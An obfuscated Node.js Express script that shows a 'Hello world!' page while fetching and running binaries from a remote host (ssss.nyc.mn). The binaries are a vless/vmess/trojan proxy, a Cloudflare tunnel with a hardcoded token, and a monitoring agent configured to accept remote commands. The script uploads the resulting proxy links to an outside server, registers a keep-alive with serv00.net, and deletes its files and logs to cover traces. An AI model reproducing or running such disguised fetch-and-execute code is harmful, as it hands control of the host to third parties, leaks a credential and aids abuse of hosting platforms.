const _0x5372c7=_0x5ce8;(function(_0x5f11cf,_0x3d6a18){const _0x552e23=_0x5ce8,_0x5bd1a7=_0x5f11cf();while(!![]){try{const _0x2410f1=parseInt(_0x552e23(0x112))/0x1+-parseInt(_0x552e23(0x121))/0x2+parseInt(_0x552e23(0xf1))/0x3*(-parseInt(_0x552e23(0xe7))/0x4)+-parseInt(_0x552e23(0x116))/0x5+-parseInt(_0x552e23(0x129))/0x6*(parseInt(_0x552e23(0xcd))/0x7)+-parseInt(_0x552e23(0xf3))/0x8+parseInt(_0x552e23(0xac))/0x9;if(_0x2410f1===_0x3d6a18)break;else _0x5bd1a7['push'](_0x5bd1a7['shift']());}catch(_0x366d80){_0x5bd1a7['push'](_0x5bd1a7['shift']());}}}(_0x2f69,0x2fe7f));const express=require(_0x5372c7(0xc0)),app=express(),axios=require(_0x5372c7(0x81)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x5372c7(0xc7)),exec=promisify(require(_0x5372c7(0x123))[_0x5372c7(0xe3)]),{execSync}=require(_0x5372c7(0x123)),UPLOAD_URL=process[_0x5372c7(0xe6)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x5372c7(0xe6)][_0x5372c7(0x10a)]||'',AUTO_ACCESS=process[_0x5372c7(0xe6)][_0x5372c7(0x8f)]||![],FILE_PATH=process[_0x5372c7(0xe6)]['FILE_PATH']||_0x5372c7(0x95),SUB_PATH=process['env']['SUB_PATH']||'sub',PORT=process[_0x5372c7(0xe6)][_0x5372c7(0xb3)]||process[_0x5372c7(0xe6)][_0x5372c7(0x89)]||0xbb8,UUID=process['env'][_0x5372c7(0xdb)]||_0x5372c7(0xea),NEZHA_SERVER=process[_0x5372c7(0xe6)][_0x5372c7(0xdd)]||'',NEZHA_PORT=process[_0x5372c7(0xe6)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x5372c7(0xe6)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x5372c7(0xc4)]||'railway.8.d.f.a.0.6.3.0.0.0.7.4.0.1.0.0.2.ip6.arpa',ARGO_AUTH=process[_0x5372c7(0xe6)][_0x5372c7(0xf8)]||'eyJhIjoiYTFmZDA5MGM0ZWJlYWU2OWI5NzY5MTg3NzVhOWE0ZmYiLCJ0IjoiNzU0NmQwMTYtOTNiZC00Y2RhLTkzZjctYzY2ZTM1MmQxZjUxIiwicyI6Ik0yWmhOR1l5WXpFdE5qRmhNaTAwTnpjNExXSmlNRFl0TjJaaE16RmlOamcyWVRjNSJ9',ARGO_PORT=process[_0x5372c7(0xe6)][_0x5372c7(0x138)]||0x1f41,CFIP=process[_0x5372c7(0xe6)][_0x5372c7(0x132)]||_0x5372c7(0xba),CFPORT=process[_0x5372c7(0xe6)][_0x5372c7(0x137)]||0x1bb,NAME=process[_0x5372c7(0xe6)][_0x5372c7(0xf5)]||'RailwayArgo';!fs['existsSync'](FILE_PATH)?(fs[_0x5372c7(0xed)](FILE_PATH),console[_0x5372c7(0xdc)](FILE_PATH+_0x5372c7(0xb1))):console[_0x5372c7(0xdc)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x201afa=_0x5372c7,_0x245e9b=_0x201afa(0xcc);let _0x330773='';for(let _0x1f0f77=0x0;_0x1f0f77<0x6;_0x1f0f77++){_0x330773+=_0x245e9b[_0x201afa(0xae)](Math[_0x201afa(0x133)](Math[_0x201afa(0x12c)]()*_0x245e9b[_0x201afa(0xa7)]));}return _0x330773;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5372c7(0x97)](FILE_PATH,npmName),phpPath=path[_0x5372c7(0x97)](FILE_PATH,phpName),webPath=path[_0x5372c7(0x97)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x5372c7(0x97)](FILE_PATH,_0x5372c7(0xca)),listPath=path[_0x5372c7(0x97)](FILE_PATH,_0x5372c7(0x106)),bootLogPath=path[_0x5372c7(0x97)](FILE_PATH,_0x5372c7(0x13a)),configPath=path[_0x5372c7(0x97)](FILE_PATH,_0x5372c7(0x10c));function _0x2f69(){const _0x66207a=['ArgoDomain:','\x20successfully','?security=tls&sni=','Hello\x20world!','345508XdgITm','\x0aclient_secret:\x20','child_process','https://amd64.ssss.nyc.mn/agent','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','get','error','push','461112XvRgfR','stringify','block','random','config.yaml','tls','/trojan-argo','status','/tunnel.yml\x20run','CFIP','floor','basename','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','npm\x20running\x20error:\x20','CFPORT','ARGO_PORT','https://amd64.ssss.nyc.mn/v1','boot.log','none','send','quic','axios','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','TunnelSecret','aarch64','statSync','clear','unlinkSync','/api/add-subscriptions','PORT','/api/add-nodes','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20>/dev/null\x202>&1','127.0.0.1','readFileSync','AUTO_ACCESS','toString','match','\x22\x20>\x20/dev/null\x202>&1','/api/delete-nodes','test','./tmp','\x0a\x20\x20\x20\x20','join','then','application/json','&path=%2Ftrojan-argo%3Fed%3D2560#','Unhandled\x20error\x20in\x20startserver:','unlink','2087','text/plain;\x20charset=utf-8','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','win32','\x0a\x20\x20\x0avmess://','forEach','\x20-c\x20\x22','filter','false','http','length','Error\x20in\x20startserver:','Error\x20executing\x20command:\x20','firefox','\x20-c\x20','9277605OqXnyJ','createWriteStream','charAt','arch','direct','\x20is\x20created','https+local://8.8.8.8/dns-query','SERVER_PORT','https://arm64.ssss.nyc.mn/agent','writeFileSync','del\x20/f\x20/q\x20','/vmess-argo','Subscription\x20uploaded\x20successfully','split','cdns.doon.eu.org','utf-8','App\x20is\x20running','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','finish','Download\x20','express','2083','https://oooo.serv00.net/add-url','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ARGO_DOMAIN','trojan','includes','util','\x20-p\x20','/vless-argo','sub.txt','https://arm64.ssss.nyc.mn/bot','abcdefghijklmnopqrstuvwxyz','14ckpwRS','fileName','/dev/null','/sub.txt\x20saved\x20successfully','map','trim','substring','data','2053','https://amd64.ssss.nyc.mn/web','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20-s\x20','catch','https://amd64.ssss.nyc.mn/bot','UUID','log','NEZHA_SERVER','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Error\x20reading\x20boot.log:','8443','443','exec','message','\x20failed:\x20','env','4700PSpLDT','has','pop','bac74b31-b97d-44fb-b595-7abee614218d','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','vless','mkdirSync','\x20>/dev/null\x202>&1\x20&','Content-Type','.exe\x20>\x20nul\x202>&1','75saSlRx','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','1331160IIksXj','arm64','NAME','stream','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ARGO_AUTH','\x0a\x20\x20tunnel:\x20','post','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','platform','arm','unshift','https://arm64.ssss.nyc.mn/v1','\x0a\x20\x20\x0atrojan://','&fp=firefox&type=ws&host=','ARGO_DOMAIN:','nohup\x20','Empowerment\x20success\x20for\x20','response','list.txt','tunnel.json','xtls-rprx-vision','readdirSync','PROJECT_URL','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','config.json','\x20is\x20running','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','blackhole','2096','base64','74621kMZdWU','existsSync','pipe','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','1935075UqRpky','rm\x20-rf\x20','web\x20running\x20error:\x20','from','tcp','Empowerment\x20failed\x20for\x20','fileUrl'];_0x2f69=function(){return _0x66207a;};return _0x2f69();}function deleteNodes(){const _0x37d50d=_0x5372c7;try{if(!UPLOAD_URL)return;if(!fs[_0x37d50d(0x113)](subPath))return;let _0x13bc29;try{_0x13bc29=fs[_0x37d50d(0x8e)](subPath,_0x37d50d(0xbb));}catch{return null;}const _0x4ab2d1=Buffer[_0x37d50d(0x119)](_0x13bc29,_0x37d50d(0x111))[_0x37d50d(0x90)]('utf-8'),_0x3fb36c=_0x4ab2d1[_0x37d50d(0xb9)]('\x0a')[_0x37d50d(0xa4)](_0x471ae5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x471ae5));if(_0x3fb36c[_0x37d50d(0xa7)]===0x0)return;return axios[_0x37d50d(0xfa)](UPLOAD_URL+_0x37d50d(0x93),JSON[_0x37d50d(0x12a)]({'nodes':_0x3fb36c}),{'headers':{'Content-Type':_0x37d50d(0x99)}})[_0x37d50d(0xd9)](_0x16581c=>{return null;}),null;}catch(_0x5205b7){return null;}}function cleanupOldFiles(){const _0x46c1fd=_0x5372c7;try{const _0x1691dc=fs[_0x46c1fd(0x109)](FILE_PATH);_0x1691dc[_0x46c1fd(0xa2)](_0x2ced8e=>{const _0x4789e8=_0x46c1fd,_0x11005b=path[_0x4789e8(0x97)](FILE_PATH,_0x2ced8e);try{const _0xadc292=fs[_0x4789e8(0x85)](_0x11005b);_0xadc292['isFile']()&&fs[_0x4789e8(0x87)](_0x11005b);}catch(_0x3d0ab9){}});}catch(_0x26a092){}}app[_0x5372c7(0x126)]('/',function(_0x18a4c6,_0x4930eb){const _0x4e026a=_0x5372c7;_0x4930eb['send'](_0x4e026a(0x120));});async function generateConfig(){const _0x50f3dc=_0x5372c7,_0x1788db={'log':{'access':_0x50f3dc(0xcf),'error':_0x50f3dc(0xcf),'loglevel':_0x50f3dc(0x13b)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x50f3dc(0x108)}],'decryption':_0x50f3dc(0x13b),'fallbacks':[{'dest':0xbb9},{'path':_0x50f3dc(0xc9),'dest':0xbba},{'path':_0x50f3dc(0xb7),'dest':0xbbb},{'path':_0x50f3dc(0x12f),'dest':0xbbc}]},'streamSettings':{'network':_0x50f3dc(0x11a)}},{'port':0xbb9,'listen':_0x50f3dc(0x8d),'protocol':_0x50f3dc(0xec),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x50f3dc(0x11a),'security':_0x50f3dc(0x13b)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x50f3dc(0xec),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x50f3dc(0x13b),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x50f3dc(0xa6),_0x50f3dc(0x12e),_0x50f3dc(0x80)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x50f3dc(0x8d),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x50f3dc(0xb7)}},'sniffing':{'enabled':!![],'destOverride':[_0x50f3dc(0xa6),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x50f3dc(0x8d),'protocol':_0x50f3dc(0xc5),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x50f3dc(0x13b),'wsSettings':{'path':_0x50f3dc(0x12f)}},'sniffing':{'enabled':!![],'destOverride':[_0x50f3dc(0xa6),_0x50f3dc(0x12e),_0x50f3dc(0x80)],'metadataOnly':![]}}],'dns':{'servers':[_0x50f3dc(0xb2)]},'outbounds':[{'protocol':'freedom','tag':_0x50f3dc(0xb0)},{'protocol':_0x50f3dc(0x10f),'tag':_0x50f3dc(0x12b)}]};fs[_0x50f3dc(0xb5)](path[_0x50f3dc(0x97)](FILE_PATH,_0x50f3dc(0x10c)),JSON['stringify'](_0x1788db,null,0x2));}function getSystemArchitecture(){const _0x24e5b2=_0x5372c7,_0x46bef3=os[_0x24e5b2(0xaf)]();return _0x46bef3===_0x24e5b2(0xfd)||_0x46bef3===_0x24e5b2(0xf4)||_0x46bef3===_0x24e5b2(0x84)?'arm':'amd';}function _0x5ce8(_0x2fd613,_0x226c97){const _0x2f69e0=_0x2f69();return _0x5ce8=function(_0x5ce81c,_0x49eb7c){_0x5ce81c=_0x5ce81c-0x80;let _0x1596e5=_0x2f69e0[_0x5ce81c];return _0x1596e5;},_0x5ce8(_0x2fd613,_0x226c97);}function downloadFile(_0x48184e,_0x5aaedc,_0x392b44){const _0x2a749e=_0x5372c7,_0x337693=_0x48184e;!fs['existsSync'](FILE_PATH)&&fs[_0x2a749e(0xed)](FILE_PATH,{'recursive':!![]});const _0x4801f1=fs[_0x2a749e(0xad)](_0x337693);axios({'method':_0x2a749e(0x126),'url':_0x5aaedc,'responseType':_0x2a749e(0xf6)})[_0x2a749e(0x98)](_0x3a819f=>{const _0x47a948=_0x2a749e;_0x3a819f[_0x47a948(0xd4)][_0x47a948(0x114)](_0x4801f1),_0x4801f1['on'](_0x47a948(0xbe),()=>{const _0x417f54=_0x47a948;_0x4801f1['close'](),console['log'](_0x417f54(0xbf)+path[_0x417f54(0x134)](_0x337693)+_0x417f54(0x11e)),_0x392b44(null,_0x337693);}),_0x4801f1['on'](_0x47a948(0x127),_0x122f51=>{const _0x47413f=_0x47a948;fs[_0x47413f(0x9c)](_0x337693,()=>{});const _0x35155b=_0x47413f(0xbf)+path[_0x47413f(0x134)](_0x337693)+_0x47413f(0xe5)+_0x122f51[_0x47413f(0xe4)];console['error'](_0x35155b),_0x392b44(_0x35155b);});})[_0x2a749e(0xd9)](_0x4fe3be=>{const _0x4ad890=_0x2a749e,_0x482c53=_0x4ad890(0xbf)+path['basename'](_0x337693)+_0x4ad890(0xe5)+_0x4fe3be[_0x4ad890(0xe4)];console[_0x4ad890(0x127)](_0x482c53),_0x392b44(_0x482c53);});}async function downloadFilesAndRun(){const _0x5382e7=_0x5372c7,_0x16314c=getSystemArchitecture(),_0x2cef58=getFilesForArchitecture(_0x16314c);if(_0x2cef58[_0x5382e7(0xa7)]===0x0){console['log'](_0x5382e7(0xbd));return;}const _0x4d53db=_0x2cef58[_0x5382e7(0xd1)](_0x59e8bd=>{return new Promise((_0x3e46e8,_0x5b42e6)=>{const _0x3a1c52=_0x5ce8;downloadFile(_0x59e8bd[_0x3a1c52(0xce)],_0x59e8bd[_0x3a1c52(0x11c)],(_0x5b0023,_0x378737)=>{_0x5b0023?_0x5b42e6(_0x5b0023):_0x3e46e8(_0x378737);});});});try{await Promise['all'](_0x4d53db);}catch(_0x22a2c4){console[_0x5382e7(0x127)]('Error\x20downloading\x20files:',_0x22a2c4);return;}function _0x22e30f(_0x1d57b8){const _0x57c596=_0x5382e7,_0x1b0eda=0x1fd;_0x1d57b8[_0x57c596(0xa2)](_0x459a6c=>{const _0x13d53d=_0x57c596;fs[_0x13d53d(0x113)](_0x459a6c)&&fs['chmod'](_0x459a6c,_0x1b0eda,_0x3b9d3b=>{const _0x379998=_0x13d53d;_0x3b9d3b?console[_0x379998(0x127)](_0x379998(0x11b)+_0x459a6c+':\x20'+_0x3b9d3b):console[_0x379998(0xdc)](_0x379998(0x104)+_0x459a6c+':\x20'+_0x1b0eda[_0x379998(0x90)](0x8));});});}const _0x54fb04=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x22e30f(_0x54fb04);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x284616=NEZHA_SERVER[_0x5382e7(0xc6)](':')?NEZHA_SERVER[_0x5382e7(0xb9)](':')[_0x5382e7(0xe9)]():'',_0x5bbdda=new Set([_0x5382e7(0xe2),_0x5382e7(0xe1),_0x5382e7(0x110),'2087',_0x5382e7(0xc1),_0x5382e7(0xd5)]),_0x50fd58=_0x5bbdda[_0x5382e7(0xe8)](_0x284616)?'true':_0x5382e7(0xa5),_0x105798=_0x5382e7(0x122)+NEZHA_KEY+_0x5382e7(0xdf)+NEZHA_SERVER+_0x5382e7(0x135)+_0x50fd58+_0x5382e7(0xeb)+UUID;fs[_0x5382e7(0xb5)](path['join'](FILE_PATH,_0x5382e7(0x12d)),_0x105798);const _0x394a4d=_0x5382e7(0x103)+phpPath+_0x5382e7(0xa3)+FILE_PATH+_0x5382e7(0x10b);try{await exec(_0x394a4d),console[_0x5382e7(0xdc)](phpName+_0x5382e7(0x10d)),await new Promise(_0x33be4d=>setTimeout(_0x33be4d,0x3e8));}catch(_0x1276db){console[_0x5382e7(0x127)]('php\x20running\x20error:\x20'+_0x1276db);}}else{let _0x21094b='';const _0x35d4f4=[_0x5382e7(0xe2),'8443',_0x5382e7(0x110),_0x5382e7(0x9d),_0x5382e7(0xc1),_0x5382e7(0xd5)];_0x35d4f4[_0x5382e7(0xc6)](NEZHA_PORT)&&(_0x21094b='--tls');const _0x4e4da8='nohup\x20'+npmPath+_0x5382e7(0xd8)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5382e7(0xc8)+NEZHA_KEY+'\x20'+_0x21094b+_0x5382e7(0xf7);try{await exec(_0x4e4da8),console[_0x5382e7(0xdc)](npmName+'\x20is\x20running'),await new Promise(_0x4cb836=>setTimeout(_0x4cb836,0x3e8));}catch(_0x48e6ab){console[_0x5382e7(0x127)](_0x5382e7(0x136)+_0x48e6ab);}}}else console[_0x5382e7(0xdc)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x1dcbf7=_0x5382e7(0x103)+webPath+_0x5382e7(0xab)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1dcbf7),console[_0x5382e7(0xdc)](webName+'\x20is\x20running'),await new Promise(_0x48c1f3=>setTimeout(_0x48c1f3,0x3e8));}catch(_0x2b947e){console[_0x5382e7(0x127)](_0x5382e7(0x118)+_0x2b947e);}if(fs[_0x5382e7(0x113)](botPath)){let _0xa8e8c5;if(ARGO_AUTH[_0x5382e7(0x91)](/^[A-Z0-9a-z=]{120,250}$/))_0xa8e8c5=_0x5382e7(0xd7)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0xa8e8c5=_0x5382e7(0x115)+FILE_PATH+_0x5382e7(0x131):_0xa8e8c5='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x5382e7(0x103)+botPath+'\x20'+_0xa8e8c5+_0x5382e7(0xee)),console[_0x5382e7(0xdc)](botName+_0x5382e7(0x10d)),await new Promise(_0x5092cd=>setTimeout(_0x5092cd,0x7d0));}catch(_0x6dd492){console[_0x5382e7(0x127)](_0x5382e7(0xa9)+_0x6dd492);}}await new Promise(_0x1f3db6=>setTimeout(_0x1f3db6,0x1388));}function getFilesForArchitecture(_0x46cdf1){const _0x25176=_0x5372c7;let _0x120f04;_0x46cdf1===_0x25176(0xfd)?_0x120f04=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x25176(0xcb)}]:_0x120f04=[{'fileName':webPath,'fileUrl':_0x25176(0xd6)},{'fileName':botPath,'fileUrl':_0x25176(0xda)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2872ad=_0x46cdf1===_0x25176(0xfd)?_0x25176(0xb4):_0x25176(0x124);_0x120f04[_0x25176(0xfe)]({'fileName':npmPath,'fileUrl':_0x2872ad});}else{const _0x48dbaa=_0x46cdf1===_0x25176(0xfd)?_0x25176(0xff):_0x25176(0x139);_0x120f04[_0x25176(0xfe)]({'fileName':phpPath,'fileUrl':_0x48dbaa});}}return _0x120f04;}function argoType(){const _0x324650=_0x5372c7;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x324650(0xdc)](_0x324650(0xfb));return;}if(ARGO_AUTH[_0x324650(0xc6)](_0x324650(0x83))){fs[_0x324650(0xb5)](path['join'](FILE_PATH,_0x324650(0x107)),ARGO_AUTH);const _0x1dda40=_0x324650(0xf9)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x324650(0x97)](FILE_PATH,_0x324650(0x107))+_0x324650(0xc3)+ARGO_DOMAIN+_0x324650(0x82)+ARGO_PORT+_0x324650(0x9f);fs['writeFileSync'](path[_0x324650(0x97)](FILE_PATH,'tunnel.yml'),_0x1dda40);}else console[_0x324650(0xdc)](_0x324650(0x125));}argoType();async function extractDomains(){const _0x59d075=_0x5372c7;let _0x4e105c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4e105c=ARGO_DOMAIN,console[_0x59d075(0xdc)](_0x59d075(0x102),_0x4e105c),await _0x1caa66(_0x4e105c);else try{const _0x5995b6=fs[_0x59d075(0x8e)](path[_0x59d075(0x97)](FILE_PATH,_0x59d075(0x13a)),_0x59d075(0xbb)),_0x14e307=_0x5995b6[_0x59d075(0xb9)]('\x0a'),_0x7e43e5=[];_0x14e307[_0x59d075(0xa2)](_0x1e2548=>{const _0x1f4f23=_0x59d075,_0x332876=_0x1e2548[_0x1f4f23(0x91)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x332876){const _0x3a5aed=_0x332876[0x1];_0x7e43e5['push'](_0x3a5aed);}});if(_0x7e43e5['length']>0x0)_0x4e105c=_0x7e43e5[0x0],console[_0x59d075(0xdc)](_0x59d075(0x11d),_0x4e105c),await _0x1caa66(_0x4e105c);else{console[_0x59d075(0xdc)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x59d075(0x87)](path[_0x59d075(0x97)](FILE_PATH,'boot.log'));async function _0x2f8897(){const _0x5a45ad=_0x59d075;try{process[_0x5a45ad(0xfc)]===_0x5a45ad(0xa0)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x5a45ad(0xf0)):await exec('pkill\x20-f\x20\x22['+botName[_0x5a45ad(0xae)](0x0)+']'+botName[_0x5a45ad(0xd3)](0x1)+_0x5a45ad(0x92));}catch(_0x5802bb){}}_0x2f8897(),await new Promise(_0x18069a=>setTimeout(_0x18069a,0xbb8));const _0x3aa079=_0x59d075(0x8b)+FILE_PATH+_0x59d075(0xf2)+ARGO_PORT;try{await exec(_0x59d075(0x103)+botPath+'\x20'+_0x3aa079+_0x59d075(0xee)),console[_0x59d075(0xdc)](botName+_0x59d075(0x10d)),await new Promise(_0x1f0cbb=>setTimeout(_0x1f0cbb,0xbb8)),await extractDomains();}catch(_0x10653c){console[_0x59d075(0x127)](_0x59d075(0xa9)+_0x10653c);}}}catch(_0x4c82b9){console['error'](_0x59d075(0xe0),_0x4c82b9);}async function _0x1caa66(_0x5b1c23){const _0x19b3f0=_0x59d075,_0x4c9a1e=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x19b3f0(0xbb)}),_0x45349a=_0x4c9a1e[_0x19b3f0(0xd2)](),_0xfbecfb=NAME?NAME+'-'+_0x45349a:_0x45349a;return new Promise(_0x1e99bc=>{setTimeout(()=>{const _0x3e6ffe=_0x5ce8,_0x51cfdc={'v':'2','ps':''+_0xfbecfb,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3e6ffe(0x13b),'net':'ws','type':_0x3e6ffe(0x13b),'host':_0x5b1c23,'path':'/vmess-argo?ed=2560','tls':_0x3e6ffe(0x12e),'sni':_0x5b1c23,'alpn':'','fp':_0x3e6ffe(0xaa)},_0x5a7f4e='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x5b1c23+_0x3e6ffe(0x101)+_0x5b1c23+'&path=%2Fvless-argo%3Fed%3D2560#'+_0xfbecfb+_0x3e6ffe(0xa1)+Buffer[_0x3e6ffe(0x119)](JSON[_0x3e6ffe(0x12a)](_0x51cfdc))[_0x3e6ffe(0x90)](_0x3e6ffe(0x111))+_0x3e6ffe(0x100)+UUID+'@'+CFIP+':'+CFPORT+_0x3e6ffe(0x11f)+_0x5b1c23+_0x3e6ffe(0x101)+_0x5b1c23+_0x3e6ffe(0x9a)+_0xfbecfb+_0x3e6ffe(0x96);console[_0x3e6ffe(0xdc)](Buffer[_0x3e6ffe(0x119)](_0x5a7f4e)[_0x3e6ffe(0x90)](_0x3e6ffe(0x111))),fs['writeFileSync'](subPath,Buffer['from'](_0x5a7f4e)[_0x3e6ffe(0x90)](_0x3e6ffe(0x111))),console[_0x3e6ffe(0xdc)](FILE_PATH+_0x3e6ffe(0xd0)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x5843f7,_0x1e3ef9)=>{const _0x218034=_0x3e6ffe,_0x4c5880=Buffer[_0x218034(0x119)](_0x5a7f4e)['toString']('base64');_0x1e3ef9['set'](_0x218034(0xef),_0x218034(0x9e)),_0x1e3ef9[_0x218034(0x13c)](_0x4c5880);}),_0x1e99bc(_0x5a7f4e);},0x7d0);});}}async function uploadNodes(){const _0x114d31=_0x5372c7;if(UPLOAD_URL&&PROJECT_URL){const _0x3c70b9=PROJECT_URL+'/'+SUB_PATH,_0x468293={'subscription':[_0x3c70b9]};try{const _0x41d213=await axios[_0x114d31(0xfa)](UPLOAD_URL+_0x114d31(0x88),_0x468293,{'headers':{'Content-Type':'application/json'}});return _0x41d213&&_0x41d213[_0x114d31(0x130)]===0xc8?(console['log'](_0x114d31(0xb8)),_0x41d213):null;}catch(_0xc94a89){if(_0xc94a89[_0x114d31(0x105)]){if(_0xc94a89[_0x114d31(0x105)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x114d31(0x113)](listPath))return;const _0x2c01a2=fs[_0x114d31(0x8e)](listPath,_0x114d31(0xbb)),_0x42ad38=_0x2c01a2[_0x114d31(0xb9)]('\x0a')[_0x114d31(0xa4)](_0x5a457c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x114d31(0x94)](_0x5a457c));if(_0x42ad38[_0x114d31(0xa7)]===0x0)return;const _0x3168df=JSON[_0x114d31(0x12a)]({'nodes':_0x42ad38});try{const _0x463af3=await axios[_0x114d31(0xfa)](UPLOAD_URL+_0x114d31(0x8a),_0x3168df,{'headers':{'Content-Type':_0x114d31(0x99)}});return _0x463af3&&_0x463af3[_0x114d31(0x130)]===0xc8?(console[_0x114d31(0xdc)]('Nodes\x20uploaded\x20successfully'),_0x463af3):null;}catch(_0x1dd1f4){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1ecb5c=_0x5ce8,_0x4429cc=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4429cc[_0x1ecb5c(0x128)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4429cc[_0x1ecb5c(0x128)](phpPath);process[_0x1ecb5c(0xfc)]===_0x1ecb5c(0xa0)?exec(_0x1ecb5c(0xb6)+_0x4429cc[_0x1ecb5c(0x97)]('\x20')+'\x20>\x20nul\x202>&1',_0xc7da63=>{const _0x24f412=_0x1ecb5c;console[_0x24f412(0x86)](),console[_0x24f412(0xdc)]('App\x20is\x20running'),console['log'](_0x24f412(0x10e));}):exec(_0x1ecb5c(0x117)+_0x4429cc[_0x1ecb5c(0x97)]('\x20')+_0x1ecb5c(0x8c),_0x4e8d6a=>{const _0x1a6036=_0x1ecb5c;console[_0x1a6036(0x86)](),console['log'](_0x1a6036(0xbc)),console[_0x1a6036(0xdc)](_0x1a6036(0x10e));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x15c30b=_0x5372c7;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x15c30b(0xdc)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x57d141=await axios[_0x15c30b(0xfa)](_0x15c30b(0xc2),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x15c30b(0x99)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x57d141;}catch(_0x1a4a44){return console[_0x15c30b(0x127)](_0x15c30b(0xde)+_0x1a4a44['message']),null;}}async function startserver(){const _0x420668=_0x5372c7;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4b7fbd){console[_0x420668(0x127)](_0x420668(0xa8),_0x4b7fbd);}}startserver()[_0x5372c7(0xd9)](_0x177e68=>{const _0x3099d0=_0x5372c7;console[_0x3099d0(0x127)](_0x3099d0(0x9b),_0x177e68);}),app['listen'](PORT,()=>console[_0x5372c7(0xdc)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
